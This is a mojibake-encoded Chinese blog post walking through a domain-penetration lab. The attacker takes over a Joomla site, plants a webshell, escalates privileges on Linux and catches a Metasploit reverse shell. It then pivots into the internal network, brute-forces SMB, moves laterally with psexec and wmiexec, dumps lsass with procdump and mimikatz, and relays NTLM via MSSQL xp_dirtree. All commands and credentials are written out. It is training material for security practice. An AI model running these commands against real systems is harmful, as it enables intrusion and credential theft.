> **åŸæ–‡é“¾æ¥**: https://mp.weixin.qq.com/s?__biz=MzkxMzMyNzMyMA==&mid=2247573665&idx=1&sn=3434e974ea211140d44bfb73f4a22235

#  è®°ä¸€æ¬¡åŸŸæ¸—é€ä»æ‰“ç‚¹åˆ°å†…ç½‘  
ç‚¹å‡»å…³æ³¨ğŸ‘‰  é©¬å“¥ç½‘ç»œå®‰å…¨   2025-06-24 09:00  
  
## ä¸€ã€ç¯å¢ƒä¿¡æ¯  
  
  
æœ¬æ¬¡é¶åœºæ¶‰åŠå¤šå°ä¸»æœºï¼Œå…¶ IP ä¿¡æ¯å¦‚ä¸‹ï¼š  
  
  
- kali æ”»å‡»æœºï¼š172.20.10.3  
- web æœåŠ¡å™¨ï¼šå¤–ç½‘ IP ä¸º 172.20.10.3ï¼Œå†…ç½‘ IP ä¸º 192.168.93.100  
- web - Ubantuï¼š192.168.93.12  
- win7ï¼š192.168.93.30  
- win2008ï¼š192.168.93.20  
- win2012ï¼š192.168.93.10  
## äºŒã€å¤–ç½‘é˜¶æ®µæ¸—é€  
  
### 1. ä¿¡æ¯æ”¶é›†  
  
  
é¦–å…ˆæ˜ç¡® web - centos çš„å‡ºç½‘ IP ä¸º 172.20.10.3ï¼Œéšåä½¿ç”¨ fscan å·¥å…·å¯¹è¯¥ IP è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼ŒæˆåŠŸè·å–åˆ° mysql çš„ç™»å½•ä¿¡æ¯ï¼šç”¨æˆ·å rootï¼Œå¯†ç  123ï¼ŒåŒæ—¶ç¡®å®š web ç›®å½•åœ°å€ä¸ºhttp://172.20.10.3 ã€‚  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3YE9SyuUFbWUTECA6DcrMsOZzT3rorVWMeFJUu1I1PYJq73JkSxcluGA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3Ys1r7J8V1raicA6T444lAbAiaYyJFpgiaaM4dM7ibnMogb6JXQiafghr3tGg/640?wx_fmt=png&from=appmsg "")  
  
### 2. Joomla æ¡†æ¶æ¼æ´åˆ©ç”¨  
  
  
è®¿é—®ç½‘ç«™ï¼Œç»è¯†åˆ«ç¡®å®šå…¶ä½¿ç”¨ Joomla æ¡†æ¶ã€‚åˆ©ç”¨https://github.com/OWASP/joomscanå·¥å…·æ‰«æï¼Œè·å–åˆ° Joomla çš„ç‰ˆæœ¬å·ã€è·¯å¾„ä¿¡æ¯åŠé…ç½®æ–‡ä»¶æ³„éœ²ä¿¡æ¯ï¼Œå¾—åˆ°ä¸€ç³»åˆ— Joomla ç›¸å…³è·¯å¾„ï¼Œå…¶ä¸­å…³é”®çš„åå°é“¾æ¥å¦‚ä¸‹ï¼š  
  
  
- http://172.20.10.3/joomla/administrator/  
- http://172.20.10.3/administrator/  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3Y5NSq2XEK2iapxHicbjFbicMV20XqfkWlyP93SgzXtVH5AVibt9ehDSCYAQ/640?wx_fmt=png&from=appmsg "")  
  
  
ç”±äºé€šè¿‡æ•°æ®åº“å¯†ç æ— æ³•ç›´æ¥ç¡®å®š Joomla åå°å¯†ç åŠ å¯†ç±»å‹ï¼Œç»“åˆå·²è·å–çš„æ•°æ®åº“è´¦æˆ·å¯†ç ï¼Œé‡ç½® Joomla åå°å¯†ç ä¸º administrator:112233 ã€‚  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3YR0NyfXxhQU0GFgHY8ib76icHvgfibYF8avhyicKcnfgnadTXSgkv5KSYdw/640?wx_fmt=png&from=appmsg "")  
  

```
http://172.20.10.3/joomla/administrator/ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â 
http://172.20.10.3/administrator/ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â 
http://172.20.10.3/bin/ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â 
http://172.20.10.3/cache/ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â 
http://172.20.10.3/cli/ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â 
http://172.20.10.3/components/ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â 
http://172.20.10.3/includes/ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â 
http://172.20.10.3/installation/ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â 
http://172.20.10.3/language/ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â 
http://172.20.10.3/layouts/ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â 
http://172.20.10.3/libraries/ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â 
http://172.20.10.3/logs/ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â 
http://172.20.10.3/modules/ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â 
http://172.20.10.3/plugins/ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â 
http://172.20.10.3/tmp/
```

### 3. Joomla åå° getshell  
  
  
Joomla åå° getshell å¯é€šè¿‡ä¿®æ”¹æ¨¡æ¿å®ç°ï¼Œå› å·²è·å–æ•°æ®åº“ root æƒé™ï¼ŒæˆåŠŸæ·»åŠ ç”¨æˆ·åç™»å½•åå°ã€‚æ‰¾åˆ° templates ç›®å½•ä¸‹çš„ index.php æ–‡ä»¶ï¼Œç»æ“ä½œåœ¨è¯¥æ–‡ä»¶ä¸­å†™å…¥ webshell ä»£ç ï¼Œä¿å­˜åé€šè¿‡http://172.20.10.3//templates/beez3/shell.phpåœ°å€è¿æ¥ shell ã€‚ä½†è¿æ¥åå‘ç°å›  disable_fuctions é™åˆ¶æ— æ³•æ‰§è¡Œå‘½ä»¤ï¼Œåç»­éœ€è¿›è¡Œç»•è¿‡æ“ä½œã€‚  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3YibVcQynvVjmuvTibmicicOYU0l4ib9LJUgYMk6BTdb1ZrMawpMtw8SvBDEQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3YdtOKGYyEcJTmuCaxL5kG6soXibNu2Vg7vt9yib2Bica94rYZZqgeV8lyw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3YeD0G5qlXQ8P7Oxtb0wDQzxM1xQibnfCBJYDicic1k2gl0UYFXIbibpwFqQ/640?wx_fmt=png&from=appmsg "")  
  
### 4. ææƒè¿›å…¥å†…ç½‘  
  
  
è¿æ¥ shell åå‘ç°ç”¨æˆ·æƒé™é rootï¼Œåœ¨æ•°æ®åº“ä¸­è·å–åˆ°è´¦æˆ· wwwuser/wwwuser_123Aqx ï¼Œä½¿ç”¨å‘½ä»¤ ssh -oHostKeyAlgorithms=+ssh-rsa wwwuser@172.20.10.3 å°è¯•è¿æ¥ï¼ŒæˆåŠŸè¿æ¥åæŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬ï¼Œç¡®è®¤ç¬¦åˆè„ç‰›ææƒæ¡ä»¶ï¼ŒææƒæˆåŠŸåå‡†å¤‡é…åˆ msf ä¸Šçº¿ã€‚  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3YywBpzVQibrAfkyZmaoWEzd1S3QjPLYqBLJqpyDPldI7zMbOdtloQJpg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3YkEsibiaL3CTfqjhNw34agsWEiaS4h8EghgxiaJEUShAgyH5um9OlEracRA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3YNETjZ8jtLsj7N64obtqYR3Jda6QsQicg7vLopdcQZreF42rTByCHM8g/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3YA3yt43viaM57P01cibG1c5ib02LQljXHBe5HnIHrmicjpcC1yhtxYAKbpQ/640?wx_fmt=png&from=appmsg "")  
  
## ä¸‰ã€å†…ç½‘é˜¶æ®µæ¸—é€  
  
### 1. å†…ç½‘ä¿¡æ¯æ”¶é›†ä¸ä¸Šçº¿  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3Yic0ON6adwQia448FlVSQkappgwSY7Q2UXPmGnKwox7Gw5Hx1qu5Nhhicw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3YDGcpgY0Q10syR2tyfeQ5ByDItlibko9wgssiayqVCcARichdUwVlFjaUQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3Yh3K3uicicgYSdB9bnVnqBLg5mYOQEXicso8wuQkFYtB7lYEmr0PfIYT6Q/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3YTzYfQIZ1x2vBhusqaXicdvRUE7SYAQ7w3iaMzWBzMibT5BBA8GHicxUlsQ/640?wx_fmt=png&from=appmsg "")  
  
  
å°è¯•ä½¿ç”¨ crossc2 é¡¹ç›®ä¸Šçº¿ csï¼Œåå›  cs æ’ä»¶å¯¹ linux æ¸—é€æµ‹è¯•æ•ˆæœä¸ä½³ï¼Œåˆ‡æ¢è‡³ msfã€‚åœ¨ msf ä¸­æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š  
  

```
msfconsole
msf6 > use exploit/multi/handler
msf6 > set payload linux/x64/meterpreter/reverse_tcp
msf6 > set LHOST <æ”»å‡»è€…IP>
msf6 > set LPORT <ç›‘å¬ç«¯å£>
msf6 > run
```

  
æˆåŠŸä¸Šçº¿åï¼ŒæŸ¥çœ‹è·¯ç”±è¡¨å‘ç°å­˜åœ¨ 192.168.93.0/24 ç½‘æ®µã€‚  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3YWOTU2iaqLQn4uyr6KwzP1Z1zUkv7cT7uc5taIhib7HZauyWOXkoJMKeg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3YbhvicTaicvrItMGOeHLhXELiaqj8gCWOoK9y0xVTu5iaficTZw22eEWPBuA/640?wx_fmt=png&from=appmsg "")  
  
### 2. å†…ç½‘æ‰«æ  
  
  
ä½¿ç”¨å‘½ä»¤ run autoroute -s 192.168.93.0/24 é…ç½®è·¯ç”±ï¼Œå°†ä»»åŠ¡ç½®äºåå°åï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤è¿›è¡Œå†…ç½‘ smb å­˜æ´»æ‰«æï¼š  
  

```
use auxiliary/scanner/smb/smb_version
set rhosts 192.168.93.0/24
set threads 10
exploit
```

  
æ‰«æåˆ° 192.168.93.10ã€192.168.93.20ã€192.168.93.30 ä¸‰å°ä¸»æœºï¼Œä¸”å‘ç°å­˜åœ¨åŸŸ TESTã€‚  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3Y2Td5No3qF3VNUAxh5DMF0KYaI6Cpl6vza29a8N0DtVEq8Xic8ETzNHw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3YGoPicyaKy5Mro6AzdSn0ztReIFqprDVnvV8rWkjial0wMicBPqicHIa9EQ/640?wx_fmt=png&from=appmsg "")  
  
## å››ã€æ¨ªå‘æ”»å‡»  
  
### è§£æ³• 1ï¼šsmb å¯†ç çˆ†ç ´ä¸åˆ©ç”¨  
  
1. **smb å¯†ç çˆ†ç ´**  
ï¼šä½¿ç”¨ msf çš„ auxiliary/scanner/smb/smb_login æ¨¡å—è¿›è¡Œ smb å¯†ç çˆ†ç ´ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š  

```
use auxiliary/scanner/smb/smb_login
set smbuser administrator
set pass_file /root/tools/dict/vul-pass.txt
set rhosts 192.168.93.20
run
```

  
æˆåŠŸè·å–åˆ° 192.168.93.20 å’Œ 192.168.93.30 ä¸¤å°ä¸»æœºçš„å¯†ç ï¼šadministrator/123qwe!ASD ã€‚  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3YYYe9siby7YxGgWPueHc0FHX4QpEBHXgdyOYOCDUhtaMPODVaL7OibIAA/640?wx_fmt=png&from=appmsg "")  
  
  
2.Â **PsExec smb åˆ©ç”¨**  
ï¼šä½¿ç”¨ exploit/windows/smb/psexec æ¨¡å—è¿›è¡Œåˆ©ç”¨ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š  
  

```
use exploit/windows/smb/psexec
set payload windows/x64/meterpreter/bind_tcp
set rhost 192.168.93.20
set smbuser administrator
set smbpass 123qwe!ASD
run
```

  
æˆåŠŸä½¿ 192.168.93.20 ä¸»æœºä¸Šçº¿ï¼Œå¹¶å°†å…¶æ´¾ç”Ÿç»™ csã€‚  
  
  
3.Â **kali æ­£å‘ä»£ç†é…ç½®**  
ï¼šä½¿ç”¨ kali è‡ªå¸¦çš„ proxychains å·¥å…·é…ç½®ä»£ç†ï¼Œå…ˆå¤åˆ¶é…ç½®æ–‡ä»¶ cp /etc/proxychains4.conf/etc/proxychains.confï¼ˆè‹¥å·²å­˜åœ¨åˆ™æ— éœ€å¤åˆ¶ï¼‰ï¼Œç„¶åç¼–è¾‘é…ç½®æ–‡ä»¶ vi /etc/proxychains.confï¼Œåœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ  socks5 192.168.1.104 50002 aaa Aaa ã€‚  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3YaOrLGjU3ZfxRTpgMDdyoicRicEv9mxN29No7dSMicexILUFL6HPsLTtIA/640?wx_fmt=png&from=appmsg "")  
  
  
4.Â **wmiexec smb åˆ©ç”¨**  
ï¼šWMIï¼ˆWindows Management Instrumentationï¼‰æ˜¯ Windows ç®¡ç†è§„èŒƒï¼Œå¯ç”¨äºç®¡ç†æœ¬åœ°å’Œè¿œç¨‹è®¡ç®—æœºï¼Œæ”»å‡»è€…åˆ©ç”¨ wmi æ”»å‡»å…·æœ‰æ— æ—¥å¿—ã€è„šæœ¬æ— éœ€å†™å…¥ç£ç›˜çš„éšè”½æ€§ã€‚å…ˆä¸‹è½½ wmiexec å·¥å…·ï¼Œåœ°å€ä¸ºhttps://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤è¿›è¡Œå®‰è£…ï¼š  
  

```
git clone https://github.com/CoreSecurity/impacket.git
cd impacket/
python3 -m pip install .
```

  
å®‰è£…è¿‡ç¨‹ä¸­è™½å‡ºç°åŒ…å†²çªä½†æœªå½±å“ wmiexec.py ä½¿ç”¨ï¼Œä½¿ç”¨å‘½ä»¤ proxychains4 python3 wmiexec.py -debug 'administrator:123qwe!ASD@192.168.93.20' è¿æ¥ç›®æ ‡ä¸»æœº ã€‚  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3YRDtM0lxoTBGzclJBicmd8p9cqV20Gl5JDJQia2QTHrHZUc5S0FRbgyHA/640?wx_fmt=png&from=appmsg "")  
  
  
5.Â **æŸ¥æ‰¾åŸŸæ§ä¸è·å–å‡­è¯**  
ï¼šè·å–ä¸»æœºæƒé™åï¼Œå¯ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥æ‰¾åŸŸæ§ï¼š  
  
  
- æŸ¥çœ‹åŸŸæ§åˆ¶å™¨æœºå™¨åï¼šnltest /DCLIST:124-hack  
- æŸ¥çœ‹åŸŸæ§åˆ¶å™¨çš„ä¸»æœºåï¼šnslookup -type=SRV _ldap._tcp  
- æŸ¥çœ‹å½“å‰æ—¶é—´ï¼šnet time /domain  
- æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ç»„ï¼šnet group "Domain Controllers" /domian  
- æŸ¥çœ‹åŸŸæ§åˆ¶å™¨æœºå™¨åï¼šnetdom query pdc  
è·å–å‡­è¯çš„æ–¹å¼æœ‰å¤šç§ï¼Œå¯ä¸Šä¼  mimikatz å·¥å…·æˆ–ä½¿ç”¨å¾®è½¯è‡ªå¸¦çš„ procdump å·¥å…·ï¼Œå…·ä½“æ“ä½œå¦‚ä¸‹ï¼š  
  
  
- **æ–¹å¼ä¸€**  
ï¼šä½¿ç”¨ procdump ä¸‹è½½åœ°å€https://learn.microsoft.com/en-us/sysinternals/downloads/procdump ï¼Œæ‰§è¡Œ Procdump.exe -accepteula -ma lsass.exe lsass.dmp å°† lsass è¿›ç¨‹å†…å­˜è½¬å‚¨ä¸ºæ–‡ä»¶ï¼Œå°† lsass.dmp æ–‡ä»¶å¤åˆ¶åˆ° mimikatz æ‰€åœ¨ç›®å½•ï¼Œæ‰§è¡Œ mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" "exit" è·å–å‡­è¯ ã€‚  
  
- **æ–¹å¼äºŒ**  
ï¼šé€šè¿‡ smb å…±äº«æˆ– 3389 å¤åˆ¶ mimikatz åˆ°ç›®æ ‡ç³»ç»Ÿï¼Œä½¿ç”¨å‘½ä»¤ smbclient //192.168.93.20/C$ -U administrator å…±äº«æ–‡ä»¶ï¼Œæˆ–é€šè¿‡æŸ¥çœ‹å’Œå¼€å¯ 3389 è¿œç¨‹æ¡Œé¢è¿›è¡Œæ–‡ä»¶å¤åˆ¶ã€‚åœ¨ç›®æ ‡ç³»ç»Ÿä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œ mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords" "exit" > log.log è·å–å‡­è¯ ã€‚  
  
æˆåŠŸæŠ“åˆ°åŸŸæ§åˆ¶å™¨çš„å¯†ç  zxcASDqw123!! åï¼Œä½¿ç”¨ wmiexec è¿æ¥åŸŸæ§ï¼Œå‘½ä»¤ä¸º proxychains4 python3 wmiexec.py -debug 'administrator:zxcASDqw123!!@192.168.93.10' ã€‚  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3YSDmtJTvbwCtibEylmFFMS3v922ibPVtoM7iaUIj4YGSRWibYI25rIpIwHg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3YhiaQUiae8NsOqTrBrlUrUC2ibfPMlFeYuLnKfVzx5MnCORKGVPOb1ibnHg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3YicV7XT4gKIWNQuRIgtialARDHWFufTadCbBxqqeMuGjdrsH8QUv7ZBNg/640?wx_fmt=png&from=appmsg "")  
  
### è§£æ³• 2ï¼šmssql xp_dirtree NTLM Relay æ”»å‡»  
  
  
é€šè¿‡å‰æœŸæ”¶é›†çš„æ•°æ®åº“å¯†ç è¿›è¡Œæ¨ªå‘å¯†ç å–·å°„ï¼Œå‘ç° 192.168.93.20 ä¸»æœºçš„ mssql å¯ä½¿ç”¨ testuser/cvcvgjASD!@ç™»å½•ï¼Œä½†å› æƒé™é—®é¢˜æ— æ³•æ‰§è¡Œ xp_cmdshellã€‚  
  
  
ä½¿ç”¨å·¥å…·https://github.com/lgandx/Responder/è¿›è¡Œ NTLM Relay æ”»å‡»ï¼Œæ ¹æ® Python ç‰ˆæœ¬é€‰æ‹©å¯¹åº”ç‰ˆæœ¬ï¼ˆpython 2.6.x ä½¿ç”¨ 2.3.3.0 ç‰ˆæœ¬ï¼Œéœ€ä¿®æ”¹ settings.pyï¼›python 2.7.x ä½¿ç”¨ 2.3.4.0 ç‰ˆæœ¬ï¼‰ã€‚ä¿®æ”¹åŸå› æ˜¯ subprocess.check_output () å‡½æ•°åœ¨ Python 2.6.x ç‰ˆæœ¬ä¸­ä¸å¯ç”¨ï¼Œè¯¥å‡½æ•°äº Python 2.7 ç‰ˆæœ¬å¼•å…¥ã€‚ä¿®æ”¹ä»£ç å¦‚ä¸‹ï¼š  
  

```
process = subprocess.Popen([&#34;ifconfig&#34;, &#34;-a&#34;], stdout=subprocess.PIPE)
NetworkCard, _ = process.communicate()
process2 = subprocess.Popen([&#34;cat&#34;, &#34;/etc/resolv.conf&#34;], stdout=subprocess.PIPE)
DNS,_ = process2.communicate()
process3 = subprocess.Popen([&#34;netstat&#34;, &#34;-rn&#34;], stdout=subprocess.PIPE)
RoutingInfo,_ = process3.communicate()
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3Y9uOl8m50eAtBQ8DGmRXUCUSibae5pshsnEssnaeUabAwuleKHNUNlsA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3YgEAo4pGuF3S1I77rd0XvonO7yQBtu45j1uJbS69OGcJ2vIoMib0gsVw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3Y0XubwTiaEQAFPt7FUuGHibfia3FW9nRQToRJkRORHUtDRLdlvfNhKJ7EQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAlt4wnPyIAv4MyhRgnhEY3Yn1KjxdE8oEkTfTjv8icYkzut7HSJgicKT6Llor4J9gsuS7hR9taSIRJA/640?wx_fmt=png&from=appmsg "")  
  
  
ä½¿ç”¨å·¥å…·è¿›è¡Œæ”»å‡»çš„å…·ä½“æ“ä½œå¦‚ä¸‹ï¼š  
  
  
  
1.ä½¿ç”¨è„šæœ¬æ‰«æåŸŸå†…æœºå™¨çš„ SMB ç­¾åå¼€æ”¾æƒ…å†µï¼Œå‘½ä»¤ä¸º python RunFinger.py -i 192.168.93.0/24ï¼ˆå·¥å…·è·¯å¾„ä¸º / Responder-2.3.3.0/tools/RunFinger.pyï¼‰ ã€‚  
  
  
2.åˆ©ç”¨ MultiRelay.py æ”»å‡»ï¼Œå°è¯•è·å¾—ç›®æ ‡ä¸»æœºçš„ shellï¼Œå‘½ä»¤ä¸º python MultiRelay.py -t 192.168.93.30 -u ALLï¼ˆå·¥å…·è·¯å¾„ä¸º / Responder-2.3.3.0/tools/MultiRelay.pyï¼‰ ã€‚  
  
  
3.åˆ©ç”¨ Responder.py æ”»å‡»ï¼Œè·å–ç›®æ ‡æœºå™¨çš„ NTLM v2 hash å€¼ï¼Œå‘½ä»¤ä¸º python Responder.py -I eth0ï¼ˆå·¥å…·è·¯å¾„ä¸º / Responder-2.3.3.0/Responder.pyï¼‰ ã€‚  
  
  
  
è¿è¡Œç›‘å¬åï¼Œå¯ä½¿ç”¨ msf è§¦å‘æˆ–æ‰‹åŠ¨è§¦å‘ NTLMï¼Œæ‰‹åŠ¨è§¦å‘å‘½ä»¤ä¸º EXEC master.sys.xp_dirtree '\192.168.93.100\simblog.txt',0,1;ï¼ˆIP ä¸ºè¿è¡Œç›‘å¬çš„ä¸»æœº IPï¼‰ï¼›msf è§¦å‘ä½¿ç”¨ auxiliary/admin/mssql/mssql_ntlm_stealer æ¨¡å—ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š  
  
  

```
use auxiliary/admin/mssql/mssql_ntlm_stealer
set rhosts 192.168.93.20
set smbproxy 192.168.93.100
set username testuser
set password cvcvgjASD!@
run
```

  
